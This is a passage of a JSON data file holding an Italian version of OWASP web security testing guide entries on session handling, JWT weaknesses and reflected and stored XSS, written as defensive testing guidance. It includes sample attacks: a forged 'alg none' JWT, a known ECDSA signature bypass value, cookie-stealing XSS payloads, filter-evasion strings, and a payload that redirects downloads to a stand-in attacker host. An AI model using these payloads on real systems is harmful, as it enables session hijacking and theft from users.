test</h3><ul><li>Identificare tutte le variabili di sessione.</li><li>Interrompere il flusso logico di generazione della sessione.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Questa vulnerabilità può essere rilevata ed eventualmente sfruttata enumerando tutte le variabili di sessione usate dall’applicazione e analizzando in quali contesti sono valide. In particolare, questo è possibile accedendo a una sequenza di entry point e poi esaminando i punti di uscita. Nel caso di un test black-box, questa procedura è complessa e richiede anche un po’ di fortuna, poiché ogni sequenza differente può portare a un risultato diverso.</p><p>Un esempio semplice è la funzionalità di reset della password, che, nella pagina di ingresso, può richiedere all’utente alcune informazioni identificative come username o indirizzo email. Questa pagina potrebbe poi popolare la sessione con questi valori identificativi, ricevuti direttamente dal client oppure ottenuti da query o calcoli basati sull’input fornito. A questo punto potrebbero esserci altre pagine nell’applicazione che mostrano dati privati basandosi su questo oggetto di sessione. In questo modo, l’attaccante può bypassare l’autenticazione.</p><p>Il metodo più efficace per rilevare questa vulnerabilità è tramite un code review del sorgente applicativo.</p>",
      "tools": "",
      "remediation": "<h3>Remediation</h3><p>Le variabili di sessione dovrebbero essere usate solo per un singolo scopo coerente.</p><h3>Riferimenti</h3><ul><li>Session Puzzles</li><li>Session Puzzling and Session Race Conditions</li></ul>",
      "test_objectives": ""
    },
    "WSTG-SESS-09": {
      "summary": "<h3>Riassunto</h3><p>Un attaccante che ottiene l’accesso ai cookie di sessione di un utente può impersonarlo semplicemente presentando tali cookie. Questo attacco è noto come session hijacking. Nel caso di attaccanti di rete, ovvero attaccanti che controllano la rete utilizzata dalla vittima, i cookie di sessione possono essere indebitamente esposti all’attaccante tramite HTTP. Per prevenire ciò, i cookie di sessione dovrebbero essere contrassegnati con l’attributo Secure, così da essere trasmessi solo su HTTPS.</p><p>Nota che l’attributo Secure dovrebbe essere usato anche quando l’applicazione web è interamente distribuita su HTTPS, altrimenti è possibile il seguente attacco di furto di cookie. Si supponga che example.com sia interamente in HTTPS, ma non segni i cookie di sessione come Secure. Sono quindi possibili questi passaggi d’attacco:</p><p>In alternativa, il session hijacking può essere prevenuto vietando l’uso di HTTP tramite HSTS. Nota che c’è una sottigliezza legata allo scoping dei cookie. In particolare, è richiesta l’adozione completa di HSTS quando i cookie di sessione vengono rilasciati con l’attributo Domain impostato.</p><p>L’adozione completa di HSTS è descritta in uno studio chiamato Testing for Integrity Flaws in Web Sessions di Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo e Michele Bugliesi. L’adozione completa di HSTS avviene quando un host attiva HSTS per sé e per tutti i suoi sottodomini. Si parla invece di adozione parziale quando HSTS è attivo solo per il dominio principale.</p><p>Se l’attributo Domain è impostato, i cookie di sessione possono essere condivisi tra i sottodomini. L’uso di HTTP nei sottodomini dovrebbe essere evitato per prevenire la divulgazione di cookie non cifrati inviati tramite HTTP. Per esempio, se il sito example.com attiva HSTS senza l’opzione includeSubDomains e rilascia cookie di sessione con Domain=example.com, è possibile il seguente attacco:</p><p>Per prevenire questo attacco, HSTS completo dovrebbe essere attivato sul dominio apex.</p><h3>Obiettivi del test</h3><ul><li>Identificare cookie di sessione vulnerabili.</li><li>Effettuare session hijacking su cookie vulnerabili e valutare il livello di rischio.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>La strategia di test è pensata per attaccanti di rete, quindi va applicata solo a siti che non adottano HSTS completo (i siti con HSTS completo sono sicuri, poiché i cookie non vengono mai trasmessi via HTTP). Si suppone di avere due account di test sul sito da analizzare, uno che agisce da vittima e uno da attaccante. Si simula uno scenario in cui l’attaccante ruba tutti i cookie non protetti dalla divulgazione tramite HTTP e li presenta al sito per accedere all’account della vittima. Se questi cookie bastano per agire come la vittima, il session hijacking è possibile.</p><p>Ecco i passaggi per eseguire il test:</p><ul><li>se non c’è HSTS: l’attributo Secure deve essere impostato.</li><li>se c’è HSTS parziale: l’attributo Secure deve essere impostato oppure l’attributo Domain non deve essere impostato.</li></ul><p>Si consiglia di usare due dispositivi o browser diversi per vittima e attaccante, così da ridurre i falsi positivi nel caso in cui l’applicazione usi fingerprinting per verificare gli accessi dai cookie. Una versione più rapida ma meno precisa della strategia prevede un solo account di test e si ferma allo step 5 (in questo caso lo step 3 diventa inutile).</p>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP</li><li>JHijack - uno strumento per il session hijacking numerico</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-SESS-10": {
      "summary": "<h3>Riassunto</h3><p>I JSON Web Token (JWT) sono token JSON firmati crittograficamente, pensati per condividere claim tra sistemi. Sono frequentemente utilizzati come token di autenticazione o di sessione, in particolare nelle REST API.</p><p>I JWT rappresentano una fonte comune di vulnerabilità, sia per come vengono implementati nelle applicazioni che nelle librerie sottostanti. Poiché vengono utilizzati per l’autenticazione, una vulnerabilità può facilmente portare alla compromissione totale dell’applicazione.</p><h3>Obiettivi del test</h3><ul><li>Determinare se i JWT espongono informazioni sensibili.</li><li>Verificare se i JWT possono essere manipolati o modificati.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>I JWT sono composti da tre componenti:</p><ul><li>Header</li><li>Payload (o body)</li><li>Signature</li></ul><p>Ogni componente è codificato in base64 ed è separato da un punto ( . ). Nota che la codifica base64 usata in un JWT rimuove i simboli di uguale (=), quindi potrebbe essere necessario aggiungerli per decodificare le sezioni.</p><p>L’header definisce il tipo di token (tipicamente JWT) e l’algoritmo usato per la firma. Un esempio di header decodificato:</p><pre><code>{ \"alg\" : \"HS256\" , \"typ\" : \"JWT\" }</code></pre><p>Ci sono tre principali tipologie di algoritmi usati per calcolare la firma:</p><p>Esistono anche molte altre tipologie di algoritmi che possono essere usati per token cifrati (JWE), anche se meno comuni.</p><p>Il payload del JWT contiene i dati reali. Un esempio di payload:</p><pre><code>{ \"username\" : \"administrator\" , \"is_admin\" : true , \"iat\" : 1516239022 , \"exp\" : 1516242622 }</code></pre><p>Il payload solitamente non è cifrato, quindi va esaminato per verificare che non vi siano dati sensibili o potenzialmente inappropriati al suo interno.</p><p>Questo JWT include username e status amministrativo dell’utente, oltre a due claim standard (iat e exp). Questi claim sono definiti nell’RFC 7519, di cui una sintesi è riportata nella tabella seguente:</p><p>La firma viene calcolata usando l’algoritmo definito nell’header del JWT, quindi codificata in base64 e aggiunta al token. Modificare qualsiasi parte del JWT dovrebbe invalidare la firma e il token dovrebbe essere respinto dal server.</p><p>Oltre ad essere sicuro dal punto di vista crittografico, il JWT deve essere anche memorizzato e trasmesso in modo sicuro. Bisogna verificare che:</p><ul><li>Sia sempre trasmesso su connessioni cifrate (HTTPS).</li><li>Se viene memorizzato in un cookie, sia impostato con gli attributi di sicurezza appropriati.</li></ul><p>La validità del JWT va inoltre verificata, considerando i claim iat, nbf ed exp, per assicurarsi che:</p><ul><li>Il JWT abbia una durata ragionevole per l’applicazione.</li><li>I token scaduti vengano respinti dall’applicazione.</li></ul><p>Una delle vulnerabilità più gravi riscontrate con i JWT è quando l’applicazione non valida la firma correttamente. Questo avviene spesso quando uno sviluppatore usa una funzione come jwt.decode() in NodeJS, che si limita a decodificare il body del JWT, invece di jwt.verify(), che verifica prima la firma e poi decodifica il JWT.</p><p>Questo può essere testato facilmente modificando il body del JWT senza cambiare nulla nell’header o nella firma e inviandolo in una richiesta per vedere se viene accettato dall’applicazione.</p><p>Oltre agli algoritmi a chiave pubblica e basati su HMAC, la specifica JWT prevede anche un algoritmo di firma chiamato none. Come suggerisce il nome, questo significa che il JWT non ha firma e può essere modificato liberamente.</p><p>Questo può essere testato modificando l’algoritmo di firma (alg) nell’header del JWT in none, come nell’esempio seguente:</p><pre><code>{ \"alg\" : \"none\" , \"typ\" : \"JWT\" }</code></pre><p>Header e payload vanno quindi ricodificati in base64 e la firma va rimossa (lasciando il punto finale). Utilizzando l’header sopra e il payload della sezione precedente, il JWT risultante sarà:</p><pre><code>eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0K.eyJ1c2VybmFtZSI6ImFkbWluaW5pc3RyYXRvciIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTUxNjI0MjYyMn0.</code></pre><p>Alcune implementazioni cercano di prevenire ciò bloccando esplicitamente l’uso dell’algoritmo none. Se il controllo non è case-sensitive, è possibile bypassare la protezione specificando algoritmi come NoNe.</p><p>Una vulnerabilità è stata identificata nelle versioni Java dalla 15 alla 18 in cui, in alcune circostanze, non venivano validate correttamente le firme ECDSA (CVE-2022-21449, nota come “psychic signatures”). Se una di queste versioni vulnerabili viene usata per analizzare un JWT con algoritmo ES256, è possibile bypassare completamente la verifica della firma manipolando il body e sostituendo la firma con il valore:</p><pre><code>MAYCAQACAQA</code></pre><p>Risultando in un JWT simile a:</p><pre><code>eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.MAYCAQACAQA</code></pre><p>Se il JWT è firmato con un algoritmo basato su HMAC (es. HS256), la sicurezza della firma dipende esclusivamente dalla robustezza della chiave segreta utilizzata nell’HMAC.</p><p>Se l’applicazione utilizza software open source o off-the-shelf, il primo step è investigare il codice e verificare se viene usata una chiave di firma HMAC di default.</p><p>Se non esiste una chiave di default, è possibile che venga indovinata o brute-forzata. Il modo più semplice è usare lo script crackjwt.py fornendo il JWT e un dizionario.</p><p>Un’opzione più potente è convertire il JWT in un formato compatibile con John the Ripper tramite lo script jwt2john.py. John potrà così effettuare attacchi molto più avanzati sulla chiave.</p><p>Se il JWT è molto grande, può superare la dimensione massima supportata da John. In tal caso, si può aumentare il valore della variabile SALT_LIMBS in /src/hmacSHA256_fmt_plug.c (o file equivalente per altri formati HMAC) e ricompilare John, come spiegato in questa issue su GitHub.</p><p>Se si riesce a ottenere la chiave, è possibile creare e firmare JWT arbitrari, il che di solito porta alla compromissione completa dell’applicazione.</p><p>Se l’applicazione usa JWT con firma a chiave pubblica, ma non verifica che l’algoritmo sia corretto, si può sfruttare questo aspetto tramite un attacco di type confusion sulla firma. Perché sia possibile, devono verificarsi queste condizioni:</p><p>Se tutte queste condizioni sono vere, un attaccante può usare la chiave pubblica per firmare il JWT usando un algoritmo HMAC (es. HS256). Ad esempio, la libreria jsonwebtoken di Node.js usa la stessa funzione sia per token a chiave pubblica che HMAC, come nell’esempio:</p><pre><code>// Verifica di un JWT firmato con RS256 jwt . verify ( token , publicKey ); // Verifica di un JWT firmato con HS256 jwt . verify ( token , secretKey );</code></pre><p>Questo significa che, se il JWT viene firmato usando la chiave pubblica come chiave segreta per HS256, la firma sarà considerata valida.</p><p>Per sfruttare questa issue, bisogna ottenere la chiave pubblica. Il modo più comune è che l’applicazione riutilizzi la stessa chiave sia per firmare i JWT che come parte del certificato TLS. In tal caso, la chiave può essere scaricata dal server con un comando come:</p><pre><code>openssl s_client -connect example.org:443 | openssl x509 -pubkey -noout</code></pre><p>In alternativa, la chiave può essere pubblica su un file accessibile dal sito, come /.well-known/jwks.json .</p><p>Per testare questo caso, modifica il contenuto del JWT e poi firma il token con la chiave pubblica usando l’algoritmo HS256. Questo può essere difficile da fare in test black-box, perché il formato della chiave deve essere identico a quello usato dal server, quindi spazi o codifiche diverse possono causare mismatch.</p><p>Lo standard JSON Web Signature (JWS) consente di includere la chiave usata per firmare il token nell’header. Se la libreria usata per validare il token lo permette, e non verifica la chiave rispetto a una lista di chiavi approvate, questo consente a un attaccante di firmare un JWT con una chiave arbitraria a sua scelta.</p><p>Esistono diversi script che permettono questo tipo di attacco, come jwk-node-jose.py o jwt_tool.</p><h3>Test correlati</h3><ul><li>Testing for Sensitive Information Sent via Unencrypted Channels.</li><li>Testing for Cookie Attributes.</li><li>Testing Browser Storage.</li></ul>",
      "tools": "<h3>Strumenti</h3><ul><li>John the Ripper</li><li>jwt2john</li><li>jwt-cracker</li><li>JSON Web Tokens Burp Extension</li><li>ZAP JWT Add-on</li></ul><h3>Riferimenti</h3><ul><li>RFC 7515 JSON Web Signature (JWS)</li><li>RFC 7519 JSON Web Token (JWT)</li><li>OWASP JSON Web Token Cheat Sheet</li></ul>",
      "remediation": "<h3>Remediation</h3><ul><li>Usare una libreria sicura e aggiornata per gestire i JWT.</li><li>Assicurarsi che la firma sia valida e che venga utilizzato l’algoritmo atteso.</li><li>Utilizzare una chiave HMAC robusta o una chiave privata unica per firmare i JWT.</li><li>Assicurarsi che nessuna informazione sensibile venga esposta nel payload.</li><li>Verificare che i JWT siano memorizzati e trasmessi in modo sicuro.</li><li>Vedi la OWASP JSON Web Tokens Cheat Sheet.</li></ul>",
      "test_objectives": ""
    },
    "WSTG-SESS-11": {
      "summary": "<h3>Riassunto</h3><p>Le sessioni concorrenti sono un aspetto comune delle applicazioni web che permettono interazioni simultanee da parte di più utenti. Questo caso di test ha l’obiettivo di valutare la capacità dell’applicazione di gestire più sessioni attive per lo stesso utente. Questa funzionalità è essenziale per la corretta gestione delle sessioni concorrenti, in particolare in aree sensibili come i pannelli di amministrazione contenenti dati personali identificabili (PII), gli account personali degli utenti o le API che si affidano a servizi terzi per arricchire i dati forniti dall’utente. L’obiettivo principale è assicurarsi che le sessioni concorrenti siano coerenti con i requisiti di sicurezza dell’applicazione.</p><p>Comprendere le esigenze di sicurezza di un’applicazione è fondamentale per valutare se consentire sessioni concorrenti sia coerente con le funzionalità previste. Permettere sessioni concorrenti non è intrinsecamente dannoso ed è intenzionalmente previsto in molte applicazioni. Tuttavia, è essenziale garantire che la funzionalità dell’applicazione sia effettivamente allineata alle misure di sicurezza per la gestione delle sessioni concorrenti. Se sono previste sessioni multiple, è fondamentale implementare controlli di sicurezza aggiuntivi, come la gestione delle sessioni attive, la possibilità di terminare le sessioni e notifiche per l’avvio di nuove sessioni. Al contrario, se le sessioni concorrenti non sono previste dall’applicazione, è fondamentale verificare che esistano controlli efficaci contro le vulnerabilità di gestione della sessione.</p><p>Per riconoscere che le sessioni concorrenti sono necessarie, occorre considerare i seguenti fattori:</p><ul><li>Comprendere la natura dell’applicazione, in particolare i casi in cui gli utenti potrebbero aver bisogno di accesso simultaneo da diversi dispositivi o località.</li><li>Identificare operazioni critiche, come le transazioni finanziarie che richiedono accesso sicuro.</li><li>Gestire dati sensibili come le informazioni personali identificabili (PII), che richiedono interazioni sicure.</li><li>Distinguere tra un pannello di amministrazione e una normale dashboard utente per l’accesso ordinario.</li></ul><h3>Obiettivi del test</h3><ul><li>Valutare la gestione delle sessioni dell’applicazione esaminando come vengono gestite più sessioni attive per un singolo account utente.</li></ul>",
      "how-to": "<h3>Come testare</h3><ul><li>Inviare credenziali valide (username e password) per creare una sessione.</li><li>Esempio di richiesta HTTP: POST /login HTTP/1.1 Host: www.example.com Content-Length: 32 username=admin&password=admin123</li><li>Esempio di risposta: HTTP/1.1 200 OK Set-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure</li><li>Salvare il cookie di autenticazione generato. In alcuni casi, il cookie viene sostituito da token come i JSON Web Token (JWT).</li></ul><p>Esempio di richiesta HTTP:</p><pre><code>POST /login HTTP/1.1 Host: www.example.com Content-Length: 32 username=admin&password=admin123</code></pre><p>Esempio di risposta:</p><pre><code>HTTP/1.1 200 OK Set-Cookie: SESSIONID=0add0d8eyYq3HIUy09hhus; Path=/; Secure</code></pre><ul><li>Provare a generare più cookie di autenticazione inviando richieste di login (ad esempio, cento volte).</li></ul><p>Nota: L’utilizzo della modalità di navigazione privata o di container multi-account può essere utile per condurre questi test, poiché forniscono ambienti separati per testare la gestione delle sessioni senza interferenze con sessioni o cookie esistenti nel browser.</p><ul><li>Provare ad accedere all’applicazione utilizzando il primo token di sessione generato (es. SESSIONID=0add0d8eyYq3HIUy09hhus).</li><li>Se l’autenticazione con il primo token ha successo anche dopo la generazione di nuove sessioni, si può considerare un potenziale problema che indica una gestione della sessione inadeguata.</li></ul><p>Esistono anche casi di test aggiuntivi che ampliano la metodologia includendo scenari con più sessioni originate da IP o località diverse. Questi test aiutano a individuare vulnerabilità o anomalie nella gestione della sessione legate a fattori geografici o di rete:</p><ul><li>Testare più sessioni dallo stesso IP.</li><li>Testare più sessioni da IP diversi.</li><li>Testare più sessioni da località improbabili o impossibili da raggiungere nello stesso breve lasso di tempo (es. una sessione creata in un paese specifico, seguita da un’altra sessione generata cinque minuti dopo da un paese diverso).</li></ul>",
      "tools": "<h3>Strumenti consigliati</h3><ul><li>Zed Attack Proxy</li><li>Burp Suite Web Proxy</li></ul>",
      "remediation": "<h3>Remediation</h3><p>L’applicazione dovrebbe monitorare e limitare il numero di sessioni attive per ogni account utente. Se viene superato il massimo consentito di sessioni, il sistema deve invalidare le sessioni precedenti per mantenere la sicurezza. L’implementazione di soluzioni aggiuntive può mitigare ulteriormente questa vulnerabilità:</p>",
      "test_objectives": ""
    },
    "WSTG-INPV-01": {
      "summary": "<h3>Riassunto</h3><p>Le vulnerabilità di Cross-site Scripting riflesso (XSS riflesso) si verificano quando un attaccante inietta codice eseguibile dal browser all'interno di una singola risposta HTTP. L'attacco iniettato non viene memorizzato nell'applicazione stessa: è non persistente e impatta solo gli utenti che aprono un link creato appositamente in modo malevolo o una pagina web di terze parti. La stringa di attacco viene inclusa come parte dell’URI o dei parametri HTTP creati ad hoc, viene processata in modo improprio dall'applicazione e ritornata alla vittima.</p><p>Gli XSS riflessi sono il tipo più frequente di attacco XSS riscontrato “in the wild”. Sono anche noti come XSS non persistenti e, poiché il payload viene consegnato ed eseguito tramite una singola richiesta e risposta, sono anche detti first-order o XSS di tipo 1.</p><p>Quando un'applicazione web è vulnerabile a questo tipo di attacco, restituisce input non validato inviato tramite richieste direttamente al client. Il modus operandi tipico dell’attacco include una fase di progettazione, in cui l'attaccante crea e testa un URI malevolo, una fase di social engineering, in cui convince le vittime ad aprire il link nel loro browser, e l’esecuzione del codice dannoso tramite il browser della vittima.</p><p>Di solito il codice dell’attaccante è scritto in JavaScript, ma vengono usati anche altri linguaggi di scripting come ActionScript e VBScript. Gli attaccanti sfruttano tipicamente queste vulnerabilità per installare keylogger, rubare i cookie della vittima, eseguire furto della clipboard o modificare il contenuto della pagina (ad esempio link per download).</p><p>Una delle principali difficoltà nella prevenzione delle vulnerabilità XSS è la corretta codifica dei caratteri. In alcuni casi, il server web o l'applicazione potrebbe non filtrare alcune codifiche dei caratteri: ad esempio, l'applicazione potrebbe filtrare <script> ma non %3cscript%3e, che rappresenta la stessa tag in una codifica diversa.</p><h3>Obiettivi del test</h3><ul><li>Identificare le variabili riflesse nelle risposte.</li><li>Valutare i dati accettati in input e la codifica applicata in output (se presente).</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Un test black-box include almeno tre fasi:</p><p>Rilevare i vettori di input. Per ogni pagina web, il tester deve identificare tutte le variabili definite dall’utente e come sia possibile fornirle in input. Questo include input nascosti o non ovvi, come parametri HTTP, dati POST, campi nascosti dei form e valori predefiniti di radio button o selettori. In genere vengono usati editor HTML nel browser o web proxy per visualizzare queste variabili nascoste. Vedi esempio sotto.</p><p>Analizzare ciascun vettore di input per individuare potenziali vulnerabilità. Per rilevare una vulnerabilità XSS, il tester usa tipicamente dati di input appositamente preparati su ogni vettore. Questi dati sono solitamente innocui, ma causano comportamenti nel browser che manifestano la vulnerabilità. I dati di test possono essere generati tramite un fuzzer per applicazioni web, una lista automatica di stringhe d’attacco note o manualmente. Alcuni esempi di questi input sono:</p><ul><li><script>alert(123)</script></li><li>\"><script>alert(document.cookie)</script></li></ul><p>Per una lista esaustiva di possibili stringhe di test, vedi la XSS Filter Evasion Cheat Sheet.</p><p>Per ogni input testato nella fase precedente, il tester analizzerà il risultato e stabilirà se rappresenta una vulnerabilità che ha un impatto realistico sulla sicurezza della web application. Questo richiede di esaminare il codice HTML della pagina risultante e cercare l’input di test. Una volta individuato, il tester identifica eventuali caratteri speciali che non sono stati codificati, sostituiti o filtrati. Il set di caratteri speciali vulnerabili non filtrati dipenderà dal contesto della sezione HTML.</p><p>Idealmente tutti i caratteri speciali HTML dovrebbero essere sostituiti con le relative entità HTML. Le principali entità HTML da identificare sono:</p><ul><li>&gt; (maggiore)</li><li>&lt; (minore)</li><li>&amp; (e commerciale)</li><li>' (apostrofo o singolo apice)</li><li>\" (doppio apice)</li></ul><p>Una lista completa delle entità è definita dalle specifiche HTML e XML. Wikipedia ha una reference completa.</p><p>Nel contesto di un’azione HTML o di codice JavaScript, un insieme diverso di caratteri speciali dovrà essere “escapato”, codificato, sostituito o filtrato. Questi caratteri includono:</p><ul><li>\\n (newline)</li><li>\\r (carriage return)</li><li>' (apostrofo)</li><li>\" (doppio apice)</li><li>\\ (backslash)</li><li>\\uXXXX (valori unicode)</li></ul><p>Per una reference più completa, consulta la guida JavaScript di Mozilla.</p><p>Ad esempio, considera un sito con un messaggio di benvenuto Welcome %username% e un link per il download.</p><p>Figura 4.7.1-1: XSS Esempio 1</p><br><p>Il tester deve sospettare che ogni punto di inserimento dati possa portare a un attacco XSS. Per analizzarlo, gioca con la variabile user e cerca di attivare la vulnerabilità.</p><p>Prova a cliccare su questo link e osserva il risultato:</p><pre><code>https://example.com/index.php?user=<script>alert(123)</script></code></pre><p>Se non viene applicata alcuna sanitizzazione, si otterrà il seguente popup:</p><p>Figura 4.7.1-2: XSS Esempio 1</p><br><p>Questo indica che esiste una vulnerabilità XSS e che il tester può eseguire codice arbitrario nel browser di chiunque clicchi sul link dell’attaccante.</p><p>Proviamo un altro codice (link):</p><pre><code>https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName(\"a\");AllLinks[0].href = \"https://badexample.com/malicious.exe\";}</script></code></pre><p>Questo produrrà il seguente comportamento:</p><p>Figura 4.7.1-3: XSS Esempio 2</p><br><p>Questo farà sì che l’utente, cliccando sul link fornito dal tester, scarichi il file malicious.exe da un sito controllato dall’attaccante.</p><p>Gli attacchi XSS riflessi vengono prevenuti quando l’applicazione web sanifica l’input, un web application firewall blocca input malevolo, o tramite meccanismi dei browser moderni. Il tester deve però testare la vulnerabilità assumendo che il browser NON blocchi l’attacco: il browser può essere non aggiornato o avere le funzionalità di sicurezza disabilitate. Analogamente, un WAF potrebbe non riconoscere attacchi sconosciuti. Un attaccante può quindi creare una stringa d’attacco non riconosciuta.</p><p>La maggior parte della prevenzione XSS dipende quindi dalla sanitizzazione dell’input non affidabile lato applicazione. Sono disponibili diversi meccanismi per gli sviluppatori, come la restituzione di un errore, la rimozione, la codifica o la sostituzione dell’input non valido. Il modo in cui l’applicazione rileva e corregge l’input non valido è un altro punto debole. Una deny list potrebbe non coprire tutte le possibili stringhe d’attacco, una allow list potrebbe essere troppo permissiva, la sanitizzazione potrebbe fallire o un certo tipo di input potrebbe essere erroneamente considerato sicuro e non sanificato. Tutto ciò permette all’attaccante di bypassare i filtri XSS.</p><p>La XSS Filter Evasion Cheat Sheet documenta i principali test di evasione dei filtri.</p><p>Poiché questi filtri sono basati su deny list, non potranno bloccare ogni espressione possibile. Ci sono casi in cui un exploit XSS è possibile anche senza usare tag <script> o caratteri come &lt; e &gt; che vengono comunemente filtrati.</p><p>Ad esempio, l’applicazione web potrebbe usare l’input utente per valorizzare un attributo, come nel seguente codice:</p><pre><code><input type= \"text\" name= \"state\" value= \"INPUT_FROM_USER\" ></code></pre><p>L’attaccante potrebbe quindi inviare questo input:</p><pre><code>\" onfocus=\"alert(document.cookie)</code></pre><p>In alcuni casi la sanitizzazione viene applicata una sola volta e non ricorsivamente. In tal caso l’attaccante può battere il filtro inviando una stringa con tentativi multipli, come questa:</p><pre><code><scr<script>ipt>alert(document.cookie)</script></code></pre><p>Supponiamo che gli sviluppatori abbiano implementato questo codice per proteggere l’input dall’inclusione di script esterni:</p><pre><code><? $re = \"/<script[^>]+src/i\" ; if ( preg_match ( $re , $_GET [ 'var' ])) { echo \"Filtered\" ; return ; } echo \"Welcome \" . $_GET [ 'var' ] . \" !\" ; ?></code></pre><p>Scomponendo l’espressione regolare:</p><p>Questa serve a filtrare espressioni tipo <script src=\"https://attacker/xss.js\"></script>, un attacco comune. Ma si può bypassare la sanitizzazione usando il carattere > in un attributo tra script e src, così:</p><pre><code>https://example/?var=<SCRIPT%20a=\">\"%20SRC=\"https://attacker/xss.js\"></SCRIPT></code></pre><p>Questo sfrutta la vulnerabilità XSS riflesso vista prima, eseguendo il JavaScript dell’attaccante come se provenisse dal sito vittima, https://example/.</p><p>Un altro metodo di bypass è l’HTTP Parameter Pollution (HPP), tecnica descritta per la prima volta da Stefano di Paola e Luca Carettoni nel 2009 alla conferenza OWASP Poland. Vedi il test per HTTP Parameter Pollution per maggiori informazioni. Questa tecnica consiste nello spezzare un vettore d’attacco su più parametri con lo stesso nome. La manipolazione del valore di ogni parametro dipende da come ciascuna tecnologia interpreta questi parametri, quindi l’evasione non è sempre possibile. Se l’ambiente testato concatena i valori di tutti i parametri con lo stesso nome, l’attaccante può usarla per bypassare meccanismi di sicurezza basati su pattern. <br> Attacco regolare:</p><pre><code>https://example/page.php?param=<script>[...]</script></code></pre><p>Attacco con HPP:</p><pre><code>https://example/page.php?param=<script&param=>[...]</&param=script></code></pre><p>Vedi la XSS Filter Evasion Cheat Sheet per una lista dettagliata delle tecniche di evasione. Infine, l’analisi delle risposte può essere complessa. Un modo semplice è usare codice che mostra un alert, come nei nostri esempi. Questo di solito indica che un attaccante potrebbe eseguire JavaScript arbitrario nei browser dei visitatori.</p><p>Il test gray-box è simile al black-box, ma il pentester ha conoscenze parziali dell’applicazione. In questo caso, può sapere come vengono validati gli input o come viene reso l’input all’utente.</p><p>Se si ha accesso al codice sorgente (white-box), tutte le variabili ricevute dagli utenti vanno analizzate, così come ogni procedura di sanitizzazione implementata, per valutare se può essere aggirata.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>PHP Charset Encoder (PCE): aiuta a codificare testi arbitrari in 65 tipi di charset utilizzabili in payload personalizzati.</li><li>Hackvertor: strumento online che permette molti tipi di codifica e offuscamento di JavaScript (o qualsiasi stringa).</li><li>XSS-Proxy: tool avanzato per attacchi Cross-Site Scripting (XSS).</li><li>ratproxy: strumento di audit di sicurezza web semi-automatico e largamente passivo, ottimizzato per rilevare potenziali problemi e annotare automaticamente design pattern di sicurezza osservando il traffico reale generato dall’utente in ambienti web 2.0 complessi.</li><li>Burp Proxy: proxy HTTP/S interattivo per testare e attaccare applicazioni web.</li><li>Zed Attack Proxy (ZAP): proxy HTTP/S interattivo per attaccare e testare applicazioni web con scanner integrato.</li></ul><h3>Riferimenti</h3><ul><li>XSS Filter Evasion Cheat Sheet</li></ul><ul><li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Seconda Edizione, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li><li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li><li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li></ul><ul><li>CERT - Malicious HTML Tags Embedded in Client Web Requests</li><li>cgisecurity.com - The Cross Site Scripting FAQ</li><li>S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-02": {
      "summary": "<h3>Riassunto</h3><p>Lo Stored Cross-site Scripting (XSS) è la tipologia più pericolosa di Cross Site Scripting. Le applicazioni web che consentono agli utenti di memorizzare dati sono potenzialmente esposte a questo tipo di attacco. Questo capitolo illustra esempi di iniezione di XSS persistente e scenari di exploitation correlati.</p><p>L'XSS persistente si verifica quando una web application raccoglie input da un utente, che può essere malevolo, e lo memorizza in un archivio dati per un utilizzo successivo. L'input memorizzato non viene filtrato correttamente. Di conseguenza, i dati malevoli appariranno come parte del sito ed eseguiti dal browser dell'utente con i privilegi dell'applicazione web. Poiché questa vulnerabilità coinvolge tipicamente almeno due richieste all'applicazione, viene anche chiamata XSS di seconda istanza (second-order XSS).</p><p>Questa vulnerabilità può essere utilizzata per condurre numerosi attacchi browser-based tra cui:</p><ul><li>Compromettere il browser di altri utenti</li><li>Intercettare informazioni sensibili visualizzate dagli utenti dell'applicazione</li><li>Pseudo defacement dell’applicazione</li><li>Port scanning di host interni (“interni” rispetto agli utenti dell'applicazione web)</li><li>Delivery mirata di exploit tramite browser</li><li>Altre attività malevole</li></ul><p>L’XSS persistente non necessita di un link malevolo per essere sfruttato. Una exploitation ha successo quando un utente visita una pagina affetta da XSS memorizzato. Le seguenti fasi descrivono un tipico scenario di attacco XSS persistente:</p><ul><li>L’attaccante memorizza codice malevolo nella pagina vulnerabile</li><li>L’utente si autentica nell’applicazione</li><li>L’utente visita la pagina vulnerabile</li><li>Il codice malevolo viene eseguito dal browser dell’utente</li></ul><p>Questa tipologia di attacco può essere sfruttata anche tramite framework di exploitation lato browser come BeEF e XSS Proxy. Questi framework consentono lo sviluppo di exploit JavaScript complessi.</p><p>L’XSS persistente è particolarmente pericoloso in aree applicative a cui hanno accesso utenti con privilegi elevati. Quando un amministratore visita la pagina vulnerabile, l’attacco viene eseguito automaticamente dal suo browser. Questo può esporre informazioni sensibili come i token di autorizzazione di sessione.</p><h3>Obiettivi del test</h3><ul><li>Identificare input memorizzati che vengono riflessi lato client.</li><li>Valutare gli input accettati e l’eventuale codifica applicata in output.</li></ul>",
